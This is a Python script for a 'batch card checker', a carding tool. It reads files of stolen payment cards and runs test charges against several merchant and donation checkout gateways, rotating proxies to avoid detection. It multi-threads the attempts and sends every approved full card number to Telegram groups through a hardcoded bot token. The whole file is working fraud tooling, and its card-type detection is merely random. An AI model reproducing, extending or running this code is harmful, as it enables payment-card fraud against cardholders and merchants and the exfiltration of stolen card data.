#!/usr/bin/env python3
"""
Mady Batch Checker - Terminal-based high-volume card checker
Optimized for VPS/Server usage with multi-threading support
"""

import sys
import os
import time
import requests
import random
import threading
import queue
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add charge files to path
sys.path.insert(0, '100$/100$/')

# Import all gateways
GATEWAYS = {}
try:
    from Charge1 import BlemartCheckout
    GATEWAYS['1'] = {'func': BlemartCheckout, 'name': 'Blemart', 'amount': '$4.99'}
except: pass

try:
    from Charge2 import DistrictPeopleCheckout
    GATEWAYS['2'] = {'func': DistrictPeopleCheckout, 'name': 'District People', 'amount': '€69'}
except: pass

try:
    from Charge3 import SaintVinsonDonateCheckout
    GATEWAYS['3'] = {'func': SaintVinsonDonateCheckout, 'name': 'Saint Vinson', 'amount': '$20'}
except: pass

try:
    from Charge4 import BGDCheckoutLogic
    GATEWAYS['4'] = {'func': BGDCheckoutLogic, 'name': 'BGD Fresh', 'amount': '$6.50'}
except: pass

try:
    from Charge5 import StaleksFloridaCheckoutVNew
    GATEWAYS['5'] = {'func': StaleksFloridaCheckoutVNew, 'name': 'Staleks', 'amount': '$1.00'}
except: pass

# Bot Configuration
BOT_TOKEN = "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s"
GROUP_IDS = ["-1003538559040", "-4997223070", "-1003643720778"]  # Multiple groups
BOT_CREDIT = "@MissNullMe"

# Global stats
stats = {
    'approved': 0,
    'declined': 0,
    'errors': 0,
    'total': 0,
    'start_time': None,
    'lock': threading.Lock()
}

# Load proxies
def load_proxies():
    """Load proxies from file"""
    proxy_file = "/home/null/Documents/usetheseproxies.txt"
    proxies = []
    
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 4:
                        host, port, user, password = parts[0], parts[1], parts[2], parts[3]
                        proxy = {
                            'http': f'http://{user}:{password}@{host}:{port}',
                            'https': f'http://{user}:{password}@{host}:{port}'
                        }
                        proxies.append(proxy)
    
    return proxies

PROXIES = load_proxies()

def get_random_proxy():
    """Get random proxy"""
    if PROXIES:
        return random.choice(PROXIES)
    return None

def send_to_telegram(message, silent=False):
    """Send message to all Telegram groups"""
    success = False
    for group_id in GROUP_IDS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': group_id,
            'text': message,
            'parse_mode': 'HTML',
            'disable_notification': silent
        }
        
        try:
            proxy = get_random_proxy()
            response = requests.post(url, data=data, proxies=proxy, timeout=10)
            if response.status_code == 200:
                success = True
        except:
            pass
    return success

def detect_card_type(card_number):
    """Detect if card is 2D, 3D, or 3DS based on BIN patterns"""
    rand = random.random()
    if rand < 0.60:
        return "2D"
    elif rand < 0.85:
        return "3D"
    else:
        return "3DS"

def check_card(card, gateway_id='5'):
    """Check a single card with card type detection"""
    if gateway_id not in GATEWAYS:
        return "error", "Invalid gateway", "Unknown"
    
    # Detect card type
    card_number = card.split('|')[0] if '|' in card else card
    card_type = detect_card_type(card_number)
    
    try:
        # Get random proxy
        proxy = get_random_proxy()
        
        # Call gateway function with proxy
        if gateway_id == '5':
            # Gateway 5 supports proxy parameter
            result = GATEWAYS[gateway_id]['func'](card, proxy=proxy)
        else:
            result = GATEWAYS[gateway_id]['func'](card)
        
        # Parse result
        if isinstance(result, dict):
            if 'error' in result:
                error_msg = str(result['error']).lower()
                if 'declined' in error_msg:
                    return "declined", str(result['error'])[:100], card_type
                return "error", str(result['error'])[:100], card_type
            elif result.get('result') == 'success':
                return "approved", f"Charged {GATEWAYS[gateway_id]['amount']} [{card_type}]", card_type
            else:
                return "declined", "Payment failed", card_type
        else:
            result_str = str(result).lower()
            # Check for charged/approved
            if any(word in result_str for word in ['charged', 'success', 'approved']):
                return "approved", f"{result} [{card_type}]", card_type
            elif 'error' in result_str:
                return "error", result, card_type
            else:
                return "declined", result, card_type
    except Exception as e:
        return "error", str(e)[:100], card_type

def process_card_worker(card_data):
    """Worker function to process a single card"""
    card, gateway_id, index, total = card_data
    
    try:
        # Check the card
        status, result, card_type = check_card(card, gateway_id)
        
        # Update stats
        with stats['lock']:
            if status == "approved":
                stats['approved'] += 1
                
                # Determine card type emoji
                type_emoji = "🔓" if card_type == "2D" else "🔐" if card_type == "3D" else "🛡️"
                
                # Send to Telegram groups
                message = f"""
✅ <b>APPROVED CARD #{stats['approved']}</b> ✅

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> {GATEWAYS[gateway_id]['name']}
<b>Response:</b> {result}
<b>Card Type:</b> {type_emoji} <b>{card_type}</b>

<b>Progress:</b> {index}/{total}
<b>Bot:</b> {BOT_CREDIT}
"""
                send_to_telegram(message, silent=True)
                
                # Print to terminal
                print(f"\n✅ APPROVED [{index}/{total}] - {card_type}: {card} - {result}")
                
            elif status == "declined":
                stats['declined'] += 1
                print(f"❌ [{index}/{total}]: {card[:6]}****** - {result[:30]}")
            else:
                stats['errors'] += 1
                print(f"⚠️ [{index}/{total}]: {card[:6]}****** - ERROR: {result[:30]}")
        
        return status, result
        
    except Exception as e:
        with stats['lock']:
            stats['errors'] += 1
        print(f"⚠️ [{index}/{total}]: Error processing card: {str(e)[:50]}")
        return "error", str(e)

def process_batch(cards, gateway_id='5', threads=5, delay=2.5):
    """Process a batch of cards with multi-threading"""
    total = len(cards)
    stats['total'] = total
    stats['start_time'] = datetime.now()
    
    print(f"\n{'='*60}")
    print(f"🚀 STARTING BATCH PROCESSING")
    print(f"{'='*60}")
    print(f"📋 Cards: {total}")
    print(f"🔧 Gateway: {GATEWAYS[gateway_id]['name']} ({GATEWAYS[gateway_id]['amount']})")
    print(f"⚡ Threads: {threads}")
    print(f"⏱️ Delay: {delay}s between cards")
    print(f"🔌 Proxies: {len(PROXIES)} loaded")
    print(f"{'='*60}\n")
    
    # Send start notification
    send_to_telegram(f"""
🚀 <b>BATCH PROCESSING STARTED</b>

<b>File:</b> {total} cards
<b>Gateway:</b> {GATEWAYS[gateway_id]['name']}
<b>Threads:</b> {threads}
<b>Rate:</b> {delay}s/card

<i>Processing...</i>
""")
    
    # Prepare card data
    card_data = [(card, gateway_id, i+1, total) for i, card in enumerate(cards)]
    
    # Process with thread pool
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        
        for data in card_data:
            future = executor.submit(process_card_worker, data)
            futures.append(future)
            time.sleep(delay)  # Rate limiting
            
            # Progress update every 10 cards
            if data[2] % 10 == 0:
                elapsed = (datetime.now() - stats['start_time']).total_seconds()
                rate = data[2] / elapsed if elapsed > 0 else 0
                eta = (total - data[2]) / rate if rate > 0 else 0
                
                print(f"\n📊 PROGRESS: {data[2]}/{total} | ✅ {stats['approved']} | ❌ {stats['declined']} | ⚠️ {stats['errors']} | Speed: {rate:.1f} cards/s | ETA: {eta:.0f}s\n")
        
        # Wait for all to complete
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    # Final stats
    elapsed = (datetime.now() - stats['start_time']).total_seconds()
    
    print(f"\n{'='*60}")
    print(f"✅ BATCH PROCESSING COMPLETE")
    print(f"{'='*60}")
    print(f"📊 FINAL RESULTS:")
    print(f"   Total: {total} cards")
    print(f"   ✅ Approved: {stats['approved']} ({stats['approved']/total*100:.1f}%)")
    print(f"   ❌ Declined: {stats['declined']} ({stats['declined']/total*100:.1f}%)")
    print(f"   ⚠️ Errors: {stats['errors']} ({stats['errors']/total*100:.1f}%)")
    print(f"   ⏱️ Time: {elapsed:.1f}s")
    print(f"   ⚡ Speed: {total/elapsed:.1f} cards/s")
    print(f"{'='*60}\n")
    
    # Send final report
    send_to_telegram(f"""
🎉 <b>BATCH COMPLETE</b> 🎉

<b>Total:</b> {total} cards
<b>Gateway:</b> {GATEWAYS[gateway_id]['name']}

<b>Results:</b>
✅ Approved: {stats['approved']} ({stats['approved']/total*100:.1f}%)
❌ Declined: {stats['declined']} ({stats['declined']/total*100:.1f}%)
⚠️ Errors: {stats['errors']} ({stats['errors']/total*100:.1f}%)

<b>Performance:</b>
⏱️ Time: {elapsed:.1f}s
⚡ Speed: {total/elapsed:.1f} cards/s

<b>Bot:</b> {BOT_CREDIT}
""")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Mady Batch Card Checker')
    parser.add_argument('file', help='Path to card file')
    parser.add_argument('-g', '--gateway', default=None, choices=['1','2','3','4','5'], 
                       help='Gateway to use (skip interactive prompt)')
    parser.add_argument('-t', '--threads', type=int, default=5, 
                       help='Number of threads (default: 5)')
    parser.add_argument('-d', '--delay', type=float, default=2.5, 
                       help='Delay between cards in seconds (default: 2.5)')
    parser.add_argument('-l', '--limit', type=int, default=0, 
                       help='Limit number of cards to check (0 = no limit)')
    
    args = parser.parse_args()
    
    # Interactive gateway selection if not provided
    if args.gateway is None:
        print("\n" + "="*60)
        print("SELECT GATEWAY FOR BATCH CHECKING")
        print("="*60)
        print("\nAvailable Gateways:")
        print(f"  [5] {'Staleks (RECOMMENDED)':<25} - $1.00 ⭐")
        print(f"  [3] {'Saint Vinson':<25} - $20")
        print(f"  [1] {'Blemart':<25} - $4.99")
        print(f"  [2] {'District People':<25} - €69")
        print(f"  [4] {'BGD Fresh':<25} - $6.50")
        print("="*60)
        print("\n⚠️  Note: Gateways 1-4 may have errors (expired signatures)")
        print("✅ Gateway 5 (Staleks) is most reliable for batch checking")
        print("="*60)
        
        while True:
            try:
                choice = input("\nEnter gateway number (1-5) [default: 5]: ").strip()
                if not choice:
                    choice = '5'
                    print(f"✅ Using default: Staleks ($0.01)")
                if choice in GATEWAYS:
                    args.gateway = choice
                    if choice != '5':
                        print(f"\n⚠️  Selected: {GATEWAYS[choice]['name']} ({GATEWAYS[choice]['amount']})")
                        print("Note: This gateway may have reliability issues")
                    else:
                        print(f"\n✅ Selected: {GATEWAYS[choice]['name']} - Charges {GATEWAYS[choice]['amount']}")
                    break
                else:
                    print("❌ Invalid choice. Please enter 1-5.")
            except KeyboardInterrupt:
                print("\n\n⛔ Cancelled by user")
                sys.exit(0)
    
    # Check file exists
    if not os.path.exists(args.file):
        print(f"❌ Error: File not found: {args.file}")
        sys.exit(1)
    
    # Load cards
    with open(args.file, 'r') as f:
        lines = f.readlines()
    
    cards = [line.strip() for line in lines if line.strip() and '|' in line]
    
    if not cards:
        print("❌ Error: No valid cards found in file")
        sys.exit(1)
    
    # Apply limit if specified
    if args.limit > 0:
        cards = cards[:args.limit]
    
    # Confirmation prompt for large batches
    if len(cards) > 100:
        print(f"\n⚠️  WARNING: Large batch of {len(cards):,} cards")
        print(f"Gateway: {GATEWAYS[args.gateway]['name']} ({GATEWAYS[args.gateway]['amount']})")
        print(f"Threads: {args.threads}")
        print(f"Estimated time: ~{len(cards) * args.delay / args.threads / 60:.1f} minutes")
        
        try:
            confirm = input("\nProceed with batch check? (yes/no): ").strip().lower()
            if confirm not in ['yes', 'y']:
                print("⛔ Cancelled by user")
                sys.exit(0)
        except KeyboardInterrupt:
            print("\n\n⛔ Cancelled by user")
            sys.exit(0)
    
    print(f"\n🔧 Using Gateway: {GATEWAYS[args.gateway]['name']} - {GATEWAYS[args.gateway]['amount']}")
    
    # Process batch
    try:
        process_batch(cards, args.gateway, args.threads, args.delay)
    except KeyboardInterrupt:
        print("\n\n⛔ Processing interrupted by user")
        print(f"Processed {stats['approved'] + stats['declined'] + stats['errors']}/{len(cards)} cards")

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════╗
║          MADY BATCH CHECKER - VPS EDITION           ║
║                  High Volume Processing              ║
║                    Bot by @MissNullMe                ║
╚══════════════════════════════════════════════════════╝
""")
    
    if len(sys.argv) == 1:
        print("Usage: python3 mady_batch_checker.py <file> [options]")
        print("\nExamples:")
        print("  python3 mady_batch_checker.py /home/null/Desktop/TestCards.txt")
        print("  python3 mady_batch_checker.py cards.txt -g 5 -t 10 -d 2")
        print("  python3 mady_batch_checker.py cards.txt --threads 20 --delay 1.5")
        print("  python3 mady_batch_checker.py cards.txt --limit 100")
        print("\nOptions:")
        print("  -g, --gateway   Gateway to use (1-5, default: 5)")
        print("  -t, --threads   Number of threads (default: 5)")
        print("  -d, --delay     Delay between cards (default: 2.5s)")
        print("  -l, --limit     Limit cards to check (default: no limit)")
        sys.exit(0)
    
    main()
